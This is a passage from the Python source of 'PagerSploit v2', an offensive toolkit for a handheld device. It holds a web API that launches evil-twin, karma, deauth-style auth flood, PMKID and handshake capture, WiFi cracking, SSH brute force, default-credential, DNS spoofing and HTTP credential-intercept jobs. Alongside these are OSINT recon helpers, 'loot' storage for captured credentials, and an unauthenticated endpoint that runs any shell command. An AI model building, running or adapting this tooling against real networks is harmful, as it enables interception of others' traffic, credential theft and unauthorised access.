        def do_GET(self):
            self._rec('GET'); self.send_response(200); self.end_headers()
            self.wfile.write(b'<html><body>Loading...</body></html>')
        def do_POST(self):
            body=self.rfile.read(int(self.headers.get('Content-Length',0))).decode('utf-8',errors='replace')
            self._rec('POST',body); self.send_response(302); self.send_header('Location','/'); self.end_headers()
    server=HTTPServer(('0.0.0.0',8181),_H)
    def _run():
        while not stop.is_set(): server.handle_request()
        subprocess.run(['nft','delete','table','ip','ps_intercept'],stderr=subprocess.DEVNULL)
        log('HTTP intercept stopped','info'); set_module('idle','Intercept stopped'); unreg_stop('http_intercept')
    start_job('http_intercept',_run); return stop

# ── OSINT ─────────────────────────────────────────────────────────────────
def osint_mac_lookup(mac):
    log(f'MAC lookup: {mac}','info'); set_module('MAC Lookup',mac)
    mac_clean=mac.upper().replace(':','').replace('-','')[:6]
    vendor=''
    for path in ['/usr/share/nmap/nmap-mac-prefixes','/usr/share/wireshark/manuf']:
        if os.path.exists(path):
            try:
                with open(path,'r',errors='replace') as f:
                    for line in f:
                        if line.upper().startswith(mac_clean):
                            vendor=' '.join(line.split()[1:]).strip(); break
            except: pass
        if vendor: break
    if not vendor:
        try:
            req=urllib.request.Request(f'https://api.macvendors.com/{urllib.parse.quote(mac)}',headers={'User-Agent':'PagerSploit'})
            vendor=urllib.request.urlopen(req,timeout=5).read(256).decode().strip()
        except: pass
    result={'mac':mac,'vendor':vendor or 'Unknown'}
    set_data('mac_lookup',result)
    log(f'MAC {mac}: {result["vendor"]}','success'); set_module('idle',result['vendor'])
    return result

def osint_ip_geo(ip):
    log(f'IP geo: {ip}','info'); set_module('IP Geo',ip)
    result={'ip':ip}
    try:
        req=urllib.request.Request(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query',headers={'User-Agent':'PagerSploit'})
        data=json.loads(urllib.request.urlopen(req,timeout=8).read(1024).decode())
        result.update(data)
        log(f'IP {ip}: {data.get("city","?")} {data.get("country","?")} / {data.get("isp","?")}','success')
    except Exception as e: log(f'IP geo: {e}','error')
    set_data('ip_geo',result); set_module('idle',f'{result.get("city","?")} {result.get("country","")}')
    return result

def osint_whois(target):
    log(f'WHOIS: {target}','info'); set_module('WHOIS',target)
    out=run_cmd(['whois',target],timeout=15)
    if not out or 'not found' in out.lower():
        try:
            s=socket.socket(); s.settimeout(10); s.connect(('whois.iana.org',43))
            s.send((target+'\r\n').encode()); buf=b''
            while True:
                chunk=s.recv(4096)
                if not chunk: break
                buf+=chunk
            s.close(); out=buf.decode('utf-8',errors='replace')
        except Exception as e: out=f'WHOIS error: {e}'
    save_loot('scans',f'whois_{target}_{ts()}.txt',out)
    set_data('whois',{'target':target,'raw':out})
    log(f'WHOIS done: {target}','success'); set_module('idle','WHOIS done'); return out

def osint_dns_enum(domain):
    log(f'DNS enum: {domain}','info'); set_module('DNS Enum',domain)
    results={}
    for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
        out=run_cmd(['dig','+short','-t',rtype,domain],timeout=10)
        if not out or 'command not found' in out:
            out=run_cmd(['nslookup','-type='+rtype,domain],timeout=10)
        results[rtype]=[l.strip() for l in out.splitlines() if l.strip() and not l.startswith(';')]
    ns_out=run_cmd(['dig','+short','NS',domain],timeout=10)
    for ns in ns_out.splitlines():
        ns=ns.strip().rstrip('.')
        if ns:
            axfr=run_cmd(['dig','AXFR',domain,f'@{ns}'],timeout=15)
            if 'XFR size' in axfr or 'Transfer' in axfr:
                results['AXFR']=axfr; log(f'ZONE TRANSFER: {domain}','success')
                with STATE_LOCK: STATE['loot_count']+=1
    save_loot('scans',f'dns_{domain}_{ts()}.json',json.dumps(results,indent=2))
    set_data('dns_enum',{'domain':domain,'records':results})
    log(f'DNS enum done: {domain}','success'); set_module('idle','DNS enum done'); return results

def osint_dns_bruteforce(domain, wordlist=None):
    log(f'DNS brute: {domain}','info'); set_module('DNS Brute',domain)
    if wordlist:
        try:
            with open(wordlist) as f: subs=[l.strip() for l in f if l.strip()][:500]
        except: subs=[]
    else:
        subs=['www','mail','ftp','admin','vpn','api','dev','test','staging','smtp','pop','imap',
              'ns1','ns2','mx','remote','portal','dashboard','app','shop','cdn','static','login',
              'secure','m','mobile','beta','git','jenkins','jira','confluence','gitlab','wiki']
    found=[]
    for sub in subs:
        fqdn=f'{sub}.{domain}'
        try:
            ip=socket.gethostbyname(fqdn)
            found.append({'subdomain':fqdn,'ip':ip}); log(f'Found: {fqdn} -> {ip}','success')
        except: pass
    save_loot('scans',f'dnsbrute_{domain}_{ts()}.json',json.dumps(found,indent=2))
    if found:
        with STATE_LOCK: STATE['loot_count']+=1
    set_data('dns_brute',found)
    log(f'DNS brute {domain}: {len(found)} found','success'); set_module('idle',f'{len(found)} subdomains')
    return found

def osint_wifi_geolocate(bssids):
    log(f'WiFi geo: {len(bssids)} BSSIDs','info'); set_module('WiFi Geo',f'{len(bssids)} APs')
    payload=json.dumps({'wifiAccessPoints':[{'macAddress':b} for b in bssids[:10]]}).encode()
    result={'bssids':bssids}
    try:
        req=urllib.request.Request('https://location.services.mozilla.com/v1/geolocate?key=geoclue',
            data=payload,headers={'Content-Type':'application/json','User-Agent':'PagerSploit'})
        data=json.loads(urllib.request.urlopen(req,timeout=10).read(512).decode())
        result.update(data)
        loc=data.get('location',{})
        log(f'WiFi geo: {loc.get("lat","?")} {loc.get("lng","?")} acc={data.get("accuracy","?")}m','success')
    except Exception as e: result['error']=str(e); log(f'WiFi geo: {e}','error')
    set_data('wifi_geo',result); set_module('idle','Geo done'); return result

def osint_http_fingerprint(target, port=80):
    log(f'HTTP fp: {target}:{port}','info'); set_module('HTTP Scan',f'{target}:{port}')
    proto='https' if port in [443,8443] else 'http'
    result={'target':target,'port':port,'headers':{},'tech':[]}
    try:
        req=urllib.request.Request(f'{proto}://{target}:{port}/',headers={'User-Agent':'Mozilla/5.0'})
        resp=urllib.request.urlopen(req,timeout=8)
        result['status']=resp.status; result['headers']=dict(resp.headers)
        body=resp.read(4096).decode('utf-8',errors='replace')
        h=str(result['headers']).lower()
        for tech,sig in [('WordPress','wp-content'),('Joomla','Joomla'),('Drupal','Drupal'),
                ('phpMyAdmin','phpMyAdmin'),('Jenkins','Jenkins'),('cPanel','cPanel'),
                ('Apache','Apache'),('nginx','nginx'),('IIS','Microsoft-IIS'),
                ('PHP','PHP'),('ASP.NET','ASP.NET'),('jQuery','jquery')]:
            if sig.lower() in body.lower() or sig.lower() in h: result['tech'].append(tech)
        log(f'HTTP {target}: {resp.status} tech={result["tech"]}','success')
    except Exception as e: result['error']=str(e); log(f'HTTP fp: {e}','error')
    set_data('http_headers',result)
    save_loot('scans',f'http_{target}_{ts()}.json',json.dumps(result,indent=2))
    set_module('idle','HTTP done'); return result

def osint_sysrecon():
    log('Sys recon...','info'); set_module('Sys Recon','Gathering...')
    result={}
    result['interfaces']=run_cmd(['ip','addr','show'],timeout=5)
    result['iwconfig']=run_cmd(['iwconfig'],timeout=5)
    result['br_lan_clients']=run_cmd(['arp','-n','-i','br-lan'],timeout=5)
    result['br_evil_clients']=run_cmd(['arp','-n','-i','br-evil'],timeout=5)
    result['routes']=run_cmd(['ip','route'],timeout=5)
    result['disk']=run_cmd(['df','-h'],timeout=5)
    result['processes']=run_cmd(['ps','aux'],timeout=5)
    result['nftables']=run_cmd(['nft','list','ruleset'],timeout=5)
    for lf in ['/tmp/dhcp.leases','/var/lib/misc/dnsmasq.leases']:
        if os.path.exists(lf):
            try:
                with open(lf) as f: result['dhcp_leases']=f.read()
            except: pass
    save_loot('scans',f'sysrecon_{ts()}.json',json.dumps(result,indent=2))
    set_data('sysrecon',result)
    log('Sys recon done','success'); set_module('idle','Recon done'); return result

# ── Loot / Wordlists ──────────────────────────────────────────────────────
def get_loot_list():
    loot=[]
    for root,dirs,files in os.walk(loot_path()):
        for f in files:
            path=os.path.join(root,f)
            try:
                st=os.stat(path)
                loot.append({'name':f,'path':path,'category':os.path.basename(root),
                    'size':st.st_size,'modified':datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')})
            except: pass
    loot.sort(key=lambda x: x['modified'],reverse=True)
    return loot

def get_wordlists():
    lists=[]
    for d in [os.path.normpath(loot_path('..','wordlists')),'/root/loot/wordlists','/mmc/wordlists','/root/wordlists']:
        if os.path.isdir(d):
            for f in os.listdir(d):
                if f.endswith(('.txt','.lst','.gz')):
                    path=os.path.join(d,f)
                    lists.append({'name':f,'path':path,'size':os.path.getsize(path)})
    return lists


# ── API Handler ───────────────────────────────────────────────────────────
class APIHandler(BaseHTTPRequestHandler):
    timeout = 10
    def log_message(self,*a): pass
    def send_json(self,data,code=200):
        body=json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type','application/json')
        self.send_header('Content-Length',len(body))
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Connection','close')
        self.end_headers(); self.wfile.write(body)
    def send_html(self,html):
        body=html.encode() if isinstance(html,str) else html
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length',len(body))
        self.send_header('Connection','close')
        self.end_headers(); self.wfile.write(body)
    def get_body(self):
        length=int(self.headers.get('Content-Length',0))
        if length:
            raw=self.rfile.read(length).decode('utf-8',errors='replace')
            try: return json.loads(raw)
            except: return {}
        return {}
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers','Content-Type')
        self.end_headers()
    def do_GET(self):
        path=urlparse(self.path).path
        if path=='/api/ping':
            self.send_json({'pong': True, 'module': STATE['active_module']}); return
        if path in ('/','index.html'): self.send_html(get_ui_html()); return
        if path == '/pagersploit.js':
            js_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pagersploit.js')
            try:
                with open(js_path, 'rb') as f: body = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.send_header('Content-Length', len(body))
                self.send_header('Connection', 'close')
                self.end_headers(); self.wfile.write(body)
            except Exception as e: self.send_json({'error': str(e)}, 500)
            return
        if path=='/api/state':
            with STATE_LOCK:
                s={k:v for k,v in STATE.items() if k not in ('module_data',)}
                s['jobs']=list(STATE['jobs'].keys())
                s['stop_events']=list(STATE['stop_events'].keys())
            self.send_json(s); return
        if path=='/api/log':
            with STATE_LOCK: self.send_json(list(STATE['log'][-150:]))
            return
        if path=='/api/scans':
            with STATE_LOCK: self.send_json(list(STATE['scan_results']))
            return
        if path=='/api/hosts':
            with STATE_LOCK: self.send_json(list(STATE['hosts']))
            return
        if path=='/api/loot': self.send_json(get_loot_list()); return
        if path=='/api/wordlists': self.send_json(get_wordlists()); return
        if path=='/api/portals':
            d=os.path.join(get_payload_dir(),'portals')
            self.send_json([f for f in os.listdir(d) if f.endswith('.html')] if os.path.isdir(d) else [])
            return
        if path.startswith('/api/data/'):
            self.send_json(get_data(path[len('/api/data/'):],{})); return
        if path.startswith('/api/loot/download/'):
            fname=unquote_plus(path[len('/api/loot/download/'):])
            item=next((l for l in get_loot_list() if l['name']==fname),None)
            if item and os.path.exists(item['path']):
                with open(item['path'],'rb') as f: data=f.read()
                self.send_response(200)
                self.send_header('Content-Disposition',f'attachment; filename="{fname}"')
                self.send_header('Content-Length',len(data))
                self.end_headers(); self.wfile.write(data)
            else: self.send_json({'error':'not found'},404)
            return
        self.send_json({'error':'not found'},404)

    def do_POST(self):
        path=urlparse(self.path).path
        b=self.get_body()
        def req(field,err='required'):
            v=b.get(field,'')
            if not v: self.send_json({'error':f'{field} {err}'},400); return None
            return v

        if path=='/api/wifi/scan':
            band=b.get('band','abg'); dur=int(b.get('duration',20))
            start_job('wifi_scan',wifi_scan,band,dur)
            self.send_json({'status':'scanning','band':band,'duration':dur})
        elif path=='/api/wifi/capture':
            bssid=b.get('bssid','')
            if bssid: _,hs_dir=wifi_capture(bssid,str(b.get('channel','6')),b.get('ssid','capture')); self.send_json({'status':'started','handshake_dir':hs_dir})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/crack':
            c,w=b.get('cap_file',''),b.get('wordlist','')
            if c and w: wifi_crack(c,w); self.send_json({'status':'started'})
            else: self.send_json({'error':'cap_file and wordlist required'},400)
        elif path=='/api/wifi/probe_harvest':
            wifi_probe_harvest(int(b.get('duration',60))); self.send_json({'status':'started'})
        elif path=='/api/wifi/beacon_flood':
            ssids=b.get('ssids',['Free WiFi'])
            if isinstance(ssids,str): ssids=[s.strip() for s in ssids.split('\n') if s.strip()]
            wifi_beacon_flood(ssids); self.send_json({'status':'started','count':len(ssids)})
        elif path=='/api/wifi/wps_scan':
            start_job('wps_scan',wifi_wps_scan); self.send_json({'status':'scanning'})
        elif path=='/api/wifi/karma':
            wifi_karma(str(b.get('channel','6')),b.get('ssids',[])); self.send_json({'status':'started'})
        elif path=='/api/wifi/auth_flood':
            bssid=b.get('bssid','')
            if bssid: wifi_auth_flood(bssid,str(b.get('channel','6'))); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/wifi/evil_twin':
            ssid=b.get('ssid',''); portal=b.get('portal')
            if portal: portal=os.path.join(get_payload_dir(),'portals',portal)
            if ssid: wifi_evil_twin(ssid,str(b.get('channel','6')),portal); self.send_json({'status':'started'})
            else: self.send_json({'error':'ssid required'},400)
        elif path=='/api/wifi/channel_hop':
            wifi_channel_hop(str(b.get('band','2'))); self.send_json({'status':'started'})
        elif path=='/api/wifi/pmkid':
            bssid=b.get('bssid','')
            if bssid: wifi_pmkid(bssid,str(b.get('channel','6'))); self.send_json({'status':'started'})
            else: self.send_json({'error':'bssid required'},400)
        elif path=='/api/lan/arp_scan':
            start_job('arp_scan',lan_arp_scan,b.get('subnet','172.16.52.0/24')); self.send_json({'status':'started'})
        elif path=='/api/lan/port_scan':
            t=b.get('target','')
            if t: start_job('port_scan',lan_port_scan,t,b.get('ports','1-1024')); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/service_scan':
            t=b.get('target','')
            if t: start_job('service_scan',lan_service_scan,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/os_detect':
            t=b.get('target','')
            if t: start_job('os_detect',lan_os_detect,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/banner_grab':
            t=b.get('target','')
            if t: start_job('banner_grab',lan_banner_grab,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ping_sweep':
            start_job('ping_sweep',lan_ping_sweep,b.get('subnet','172.16.52.0/24')); self.send_json({'status':'started'})
        elif path=='/api/lan/default_creds':
            t=b.get('target','')
            if t: start_job('default_creds',lan_default_creds,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ssh_brute':
            t=b.get('target','')
            if t: start_job('ssh_brute',lan_ssh_brute,t,int(b.get('port',22))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/smb_enum':
            t=b.get('target','')
            if t: start_job('smb_enum',lan_smb_enum,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/snmp_walk':
            t=b.get('target','')
            if t: start_job('snmp_walk',lan_snmp_walk,t,b.get('community','public')); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/ssl_cert':
            t=b.get('target','')
            if t: start_job('ssl_cert',lan_ssl_cert,t,int(b.get('port',443))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/lan/mdns':
            start_job('mdns',lan_mdns_discover); self.send_json({'status':'started'})
        elif path=='/api/lan/dns_spoof':
            d,r=b.get('domain',''),b.get('redirect','')
            if d and r: lan_dns_spoof(d,r); self.send_json({'status':'active','domain':d})
            else: self.send_json({'error':'domain and redirect required'},400)
        elif path=='/api/lan/http_intercept':
            lan_http_intercept(b.get('iface','wlan0')); self.send_json({'status':'started'})
        elif path=='/api/osint/mac':
            m=b.get('mac','')
            if m: start_job('mac_lookup',osint_mac_lookup,m); self.send_json({'status':'started'})
            else: self.send_json({'error':'mac required'},400)
        elif path=='/api/osint/ipgeo':
            ip=b.get('ip','')
            if ip: start_job('ipgeo',osint_ip_geo,ip); self.send_json({'status':'started'})
            else: self.send_json({'error':'ip required'},400)
        elif path=='/api/osint/whois':
            t=b.get('target','')
            if t: start_job('whois',osint_whois,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/osint/dns_enum':
            d=b.get('domain','')
            if d: start_job('dns_enum',osint_dns_enum,d); self.send_json({'status':'started'})
            else: self.send_json({'error':'domain required'},400)
        elif path=='/api/osint/dns_brute':
            d=b.get('domain','')
            if d: start_job('dns_brute',osint_dns_bruteforce,d,b.get('wordlist')); self.send_json({'status':'started'})
            else: self.send_json({'error':'domain required'},400)
        elif path=='/api/osint/wifi_geo':
            bssids=b.get('bssids',[])
            if not bssids:
                with STATE_LOCK: bssids=[a['bssid'] for a in STATE['scan_results'][:10]]
            if bssids: start_job('wifi_geo',osint_wifi_geolocate,bssids); self.send_json({'status':'started'})
            else: self.send_json({'error':'run scan first'},400)
        elif path=='/api/osint/http_headers':
            t=b.get('target','')
            if t: start_job('http_fp',osint_http_fingerprint,t,int(b.get('port',80))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/osint/sysrecon':
            start_job('sysrecon',osint_sysrecon); self.send_json({'status':'started'})
        elif path=='/api/stop':
            self.send_json({'status':'stopped' if stop_module(b.get('module','')) else 'not found'})
        elif path=='/api/stop_all':
            with STATE_LOCK:
                for ev in list(STATE['stop_events'].values()): ev.set()
                for proc in list(STATE['jobs'].values()):
                    if hasattr(proc,'terminate'):
                        try: proc.terminate()
                        except: pass
                STATE['stop_events'].clear(); STATE['jobs'].clear()
            set_module('idle','All stopped'); self.send_json({'status':'all stopped'})
        elif path=='/api/term/exec':
            cmd = b.get('cmd','').strip()
            if not cmd:
                self.send_json({'error':'no command'}); return
            log(f'$ {cmd}', 'info')
            try:
                proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, env={**os.environ, 'PATH': '/mmc/usr/bin:/mmc/usr/sbin:/usr/bin:/usr/sbin:/bin:/sbin'}
                )
                try:
                    out, _ = proc.communicate(timeout=30)
                except subprocess.TimeoutExpired:
                    proc.kill(); out, _ = proc.communicate()
                    out = out + '\n[TIMEOUT after 30s]'
                log(f'exit {proc.returncode}', 'info')
                self.send_json({'output': out, 'rc': proc.returncode})
            except Exception as e:
                self.send_json({'error': str(e), 'output': ''})
        else:
            self.send_json({'error':'unknown endpoint'},404)


# ── Pager Display ─────────────────────────────────────────────────────────
def rgb(r,g,b): return ((r&0xF8)<<8)|((g&0xFC)<<3)|(b>>3)
C_BG=rgb(4,4,12); C_TITLE=rgb(0,255,180); C_GREEN=rgb(0,255,80)
C_RED=rgb(255,40,40); C_YELLOW=rgb(255,220,0); C_WHITE=rgb(220,220,220)
C_DIM=rgb(70,70,70); C_ORANGE=rgb(255,140,0)

def pager_display_loop(p, stop_event):
    p.set_rotation(270)
    BTN_B = Pager.BTN_B
    while not stop_event.is_set():
        try:
            with STATE_LOCK:
                module   = STATE['active_module']
                status   = STATE['module_status']
                loot     = STATE['loot_count']
                ip       = STATE['server_ip']
                port     = STATE['server_port']
                last_log = STATE['log'][-1] if STATE['log'] else None
                jobs     = list(STATE['stop_events'].keys())
            p.fill_rect(0,0,480,222,C_BG)
            p.fill_rect(0,0,480,18,rgb(0,30,20))
            p.draw_text(4,2,'PAGERSPLOIT v2',C_TITLE,1)
            p.fill_rect(0,18,480,1,C_TITLE)
            p.fill_rect(4,24,472,34,rgb(0,15,10))
            p.draw_text(8,28,'CONNECT:',C_DIM,1)
            p.draw_text(68,28,f'http://{ip}:{port}',C_GREEN,1)
            p.draw_text(8,40,'USB-C ethernet or management AP',C_DIM,1)
            p.fill_rect(4,58,472,1,C_DIM)
            p.draw_text(8,64,'MODULE:',C_DIM,1)
            p.draw_text(68,64,module.upper()[:30],C_ORANGE if module!='idle' else C_DIM,1)
            p.draw_text(8,76,'STATUS:',C_DIM,1)
            p.draw_text(68,76,status[:34],C_WHITE,1)
            p.draw_text(8,90,'LOOT:',C_DIM,1)
            p.draw_text(52,90,str(loot),C_YELLOW,1)
            if last_log:
                col={'success':C_GREEN,'error':C_RED,'warn':C_ORANGE}.get(last_log['level'],C_WHITE)
                p.fill_rect(4,102,472,1,C_DIM)
                p.draw_text(8,106,f"[{last_log['time']}] {last_log['msg'][:45]}",col,1)
            if jobs:
                p.fill_rect(4,120,472,1,C_DIM)
                p.draw_text(8,124,' | '.join(jobs[:4])[:48],C_ORANGE,1)
            p.fill_rect(0,208,480,1,C_DIM)
            p.draw_text(4,210,'Browser UI active',C_DIM,1)
            p.draw_text(370,210,'B=Shutdown',C_RED,1)
            p.flip()
            _,pressed,_ = p.poll_input()
            if pressed & BTN_B:
                stop_event.set(); break
        except Exception as e:
            print(f'display: {e}',flush=True)
        time.sleep(0.3)


# ── Web UI HTML ───────────────────────────────────────────────────────────
def get_ui_html():
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pagersploit_ui.html'), 'r') as f:
        return f.read()

# ── Main ──────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--server-ip',   default='172.16.52.1')
    p.add_argument('--server-port', default='8080')
    p.add_argument('--payload-dir', required=True)
    return p.parse_args()

def run():
    args = parse_args()
    with STATE_LOCK:
        STATE['server_ip']   = args.server_ip
        STATE['server_port'] = args.server_port
        STATE['payload_dir'] = args.payload_dir

    for d in ['handshakes','credentials','scans','pmkid']:
        os.makedirs(loot_path(d), exist_ok=True)

    log(f'PagerSploit v2.0 on {args.server_ip}:{args.server_port}')
    stop_event = threading.Event()

    server = ThreadedHTTPServer(('0.0.0.0', int(args.server_port)), APIHandler)
    server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.timeout = 2
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log(f'Web UI: http://{args.server_ip}:{args.server_port}', 'success')

    with Pager() as p:
        pager_display_loop(p, stop_event)

    log('Shutting down...')
    with STATE_LOCK:
        for ev in list(STATE['stop_events'].values()): ev.set()
        for proc in list(STATE['jobs'].values()):
            if hasattr(proc,'terminate'):
                try: proc.terminate()
                except: pass
    server.shutdown()

if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f'FATAL: {e}', flush=True)
        import traceback; traceback.print_exc()
        sys.exit(1)
